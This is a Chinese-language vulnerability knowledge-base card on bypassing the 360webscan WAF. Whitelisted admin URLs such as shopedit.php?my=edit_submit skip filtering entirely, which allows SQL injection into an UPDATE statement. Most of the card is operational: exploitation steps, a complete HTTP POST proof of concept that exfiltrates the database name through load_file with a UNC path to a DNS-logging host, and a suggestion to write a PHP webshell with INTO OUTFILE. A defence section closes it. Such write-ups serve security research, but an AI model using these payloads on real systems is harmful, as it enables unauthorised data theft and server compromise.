---
id: web-generic-sqli-360webscan-whitelist-url-bypass
title: 360webscan 白名单 URL 绕过：命中 webscan_white_url 的后台接口整体跳过过滤，POST 参数直拼 UPDATE 注入
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-360webscan-whitelist-url-bypass
aliases:
- webscan_white_url
- webscan_white_directory
- 360webscan 白名单绕过
- 后白名单配置
- 后台接口不过滤
- shopedit.php edit_submit 注入
- REQUEST_URI 匹配白名单
tags:
- sqli
- mysql
- waf-bypass
- 360webscan
- whitelist
- update
- load-file
- out-of-band
- php
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-22
  verified_at: '2026-11-08T13:49:45+08:00'
  notes: 已对照原文核对：webscan_white_url 数组含 shopedit.php=>my-edit_submit、白名单命中即整请求放行的机制（P牛 2014 文章引用）、shopedit.php 635 行 UPDATE 拼接 $cid、521 行 $cid=$POST['cid']、requestrepo DNS 带外收到 juyan/evdrfzl2 子域查询截图均一致；PoC（POST 包）完整；cards.json 已如实记录 cid/value 参数映射出入并降 confidence 为 medium，合理；与堆叠注入卡确认为不同机制（配置层放行 vs 规则缺口），并列保留
---

## 一句话结论

360webscan 的 `webscan_white_url` 白名单是按“请求行（`PHP_SELF` + `QUERY_STRING`）”匹配的，只要把请求拼成白名单里登记的后台操作（如 `shopedit.php?my=edit_submit`），该请求的 POST body 就完全不过滤；若该接口自身存在参数直拼，就能在白名单保护下直接注入并用 `load_file(concat(...))` 走 UNC 路径带外取数据。

## 原理

- **白名单的匹配对象是 URL 而不是数据**：`webscan_white()` 取 `$_SERVER['PHP_SELF']` 与 `$_SERVER['QUERY_STRING']`，与 `$webscan_white_url` 数组中的 `键 => 值`（如 `'shopedit.php' => 'my=edit_submit'`）做正则匹配，命中即 `return false`，调用方随即跳过 `webscan_stopAttack()` 的整段检查。也就是说过滤粒度是“这个 URL 是不是已知合法的后台操作”，一旦命中，`$_POST`/`$_GET`/`$_COOKIE` 里放什么都不看。
- **白名单是为了让富文本/批量操作不被误杀**：后台编辑商品、发消息这类接口会提交 HTML 和引号，正则黑名单必然误报，所以开发者把它们加入白名单；攻击面由此从“绕过正则”变成“找一个在白名单里、自身又有注入的接口”。
- **本例的注入点**：`admin/shopedit.php` 在 `my=edit_submit` 分支里 `$cid = $_POST['cid']`、`$name = $_POST['name']`、`$ordername = $_POST['ordername']` 等一批参数原样取出（同文件的其它参数用了 `addslashes`，这几个没有），随后拼进 `UPDATE pre_tools SET cid='$cid', name='$name', ordername='$ordername', price1='$price1' ...`。取参与拼接之间既无转义也无类型转换。
- **为什么能带外**：`load_file()` 虽然没有回显，但 MySQL 在 Windows 上会把 UNC 路径当网络请求发起，`load_file(concat('\\\\', (select database()), '.attacker.com\\a'))` 于是把库名拼进主机名，DNS 查询直接落到攻击者的 DNS 平台，实现“无回显也能取数据”。
- **改配置也无济于事**：`$webscan_white_directory` 是目录级白名单（默认空），`$webscan_white_url` 才是本例生效的那一个；只要白名单里还留着带拼接的后台接口，过滤就等于对该接口关闭。

## 触发条件

- 站点集成 360webscan（或同源 fork），且 `$webscan_white_url` 中登记了后台接口。
- 该白名单接口存在未转义、未强类型化的参数拼接进 SQL。
- 攻击者已获得后台会话（`admin_token` 等），否则请求会被鉴权拦在注入点之前。
- MySQL 具备 `FILE` 权限且允许 UNC 路径（Windows 目标），或可用其它带外通道（`INTO OUTFILE` 到网络共享）。

## 利用步骤

1. 读取 `includes/360safe/360webscan.php`（或等价路径），确认 `$webscan_switch`、`$webscan_white_url`、`$webscan_white_directory` 的实际取值，列出所有被放行的 `脚本 => 查询串` 组合。
2. 对每个白名单接口做参数回溯：找出把 `$_POST`/`$_GET` 直接拼进 `UPDATE`/`INSERT`/`SELECT` 的参数，优先选 `query()` 直执行、未用预处理与转义的。
3. 构造请求：URL 保持与白名单完全一致（含 `my=edit_submit` 等分支参数），把 payload 放进存在拼接的 POST 字段，其余字段用合法值填充，保证业务逻辑走到执行 SQL 的分支。
4. 用带外验证：`load_file(concat('\\\\', (select database()), '.xxxx.dnslog.cn\\a'))`，观察 DNS 平台是否收到带库名的子域名；成功后再逐段替换为要取的数据（表名、账号口令等）。
5. 需要落地时改为 `SELECT ... INTO OUTFILE '<webroot>/x.php'`（该语法不受本 WAF get 规则约束），或直接改数据库内容做二次利用。

## PoC

```http
POST /admin/shopedit.php?my=edit_submit&tid=1 HTTP/1.1
Host: target:port
Cookie: admin_token=<token>; PHPSESSID=<session>; user_token=<token>
Content-Type: application/x-www-form-urlencoded

backurl=http%3A%2F%2Ftarget%2Fadmin%2Fshoplist.php&is_curl=0&showcontent=qq&curl=&curl_post=qq&goods_id=0&goods_type=0&goods_param=qq&value=123' ; select 1,load_file(concat('\\\\',(select database()),'.xxxx.dnslog.cn\\abc')) -- &cid=caigosec&name=123&ordername=123&prid=0&price1=0.00&price=0.00&cost=0.00&cost2=0.00&input=123&inputs=123&desc=123&alert=123&shopimg=123&multi=1&min=0&max=0&repeat=0&validate=0
```

响应为极短的 HTML（说明语句已执行、页面未渲染），DNS 平台收到 `<database>.xxxx.dnslog.cn` 查询即证明带外成功。

说明：原文正文称注入参数为 `cid`（第 521 行 `$cid=$_POST['cid']`），但给出的数据包把 payload 放在 `value` 字段、`cid` 置为正常值，两者存在出入；实际以“哪个字段被拼进第 635 行 UPDATE”为准，复现时逐个字段试。

## 变体与关联

- 变体：`$webscan_white_directory` 目录级白名单（默认空，常被填成 `admin`、`/dede/`）同样会让整目录放行，效果与 URL 白名单一致，排查时要一并检查。
- 变体：黑名单规则本身的缺口（分号堆叠 + `INTO OUTFILE`）不依赖白名单即可绕过，参见 `[[web-generic-sqli-360webscan-stacked-outfile-webshell]]`。
- 关联：`[[web-generic-sqli-sobey-mcheditor-wxarticlelist-whitelist-bypass]]`（同类“白名单接口自身可注入”思路）、`[[web-generic-sqli-stacked-file-table-arbitrary-file-read]]`。
- 边界：目标未装 360webscan、白名单为空、接口参数已用预处理或 `intval`/`addslashes` 处理、MySQL 无 `FILE` 权限时不成立。

## 检测与防御

- **配置侧**：白名单不要用“脚本名 + 查询串”这种粗粒度放行；改为按具体字段做白名单（只允许多行文本/HTML 字段跳过 XSS 过滤，SQL 相关参数永远过滤），并定期审计 `$webscan_white_url`/`$webscan_white_directory` 是否被随意追加。
- **代码侧**：白名单接口与其它接口用同一套 SQL 访问层，全部预处理绑定；对 `cid`、`prid`、`price` 等本应为数字的参数强制 `intval`。
- **检测**：审计后台 URL 上出现的 SQL 关键字（`load_file`、`into outfile`、`select`、`updatexml`）即使 WAF 未拦截也应告警；监控 DNS/UNC 外联（域控 DNS 日志中异常的 `<dbname>.xxx.com` 查询、445 出站连接）。
- **数据库侧**：回收业务账号 `FILE` 权限、设置 `secure_file_priv`、限制出站 SMB/DNS；开启 general log 检索 `load_file`/`INTO OUTFILE`。
- **响应**：定位被利用的白名单接口与参数，修复拼接；排查同一时段内该接口的异常 POST、DNS 外带域名与落地文件；轮换后台凭据与数据库账号。
